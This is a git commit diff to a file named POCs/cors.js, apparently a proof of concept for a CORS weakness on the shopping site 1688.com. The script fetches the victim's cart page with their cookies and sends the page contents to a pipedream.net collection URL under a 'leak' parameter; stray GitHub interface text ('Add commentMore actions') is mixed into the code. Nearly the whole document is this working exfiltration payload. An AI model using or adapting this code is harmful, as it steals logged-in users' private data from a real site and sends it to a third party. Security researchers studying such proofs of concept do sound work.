8b563d159b4284481c73048d7a2d2ebbc03e0cb4
j4xx3n <105862349+j4xx3n@users.noreply.github.com>
2025-06-11 22:12:55 -0500

    Update cors.js

--- POCs/cors.js
+++ POCs/cors.js
@@ -1,9 +1,26 @@
-javascript:(() => {
-  fetch("https://cart.1688.com/cart.htm", {
-    credentials: "include"
-  })
-  .then(res => res.text())
+
+<script>
+
+
+    fetch("https://cart.1688.com/cart.htm", {
+
+
+      credentials: "include"
+
+
+  })Add commentMore actions
+
+
+  .then(r => r.text())
+
+
   .then(data => {
+
+
     fetch("https://eocto97248t3r0j.m.pipedream.net?leak=" + encodeURIComponent(data));
+
+
   });
-})();
+
+
+</script>
